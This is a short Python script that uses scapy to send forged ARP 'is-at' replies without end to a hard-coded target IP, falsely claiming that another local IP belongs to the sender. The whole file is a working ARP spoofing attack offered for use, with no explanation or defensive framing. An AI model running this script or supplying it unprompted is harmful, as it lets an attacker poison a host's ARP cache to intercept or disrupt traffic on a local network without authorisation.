import time

from scapy.all import sendp,ARP,Ether

iface='en0'

target_ip='192.168.2.220'
fake_ip='192.168.1.41'

ethernet=Ether()
arp=ARP(pdst=target_ip,psrc=fake_ip,op='is-at')

packet=ethernet/arp

while True:
    sendp(packet,iface=iface)
    # time.sleep(1)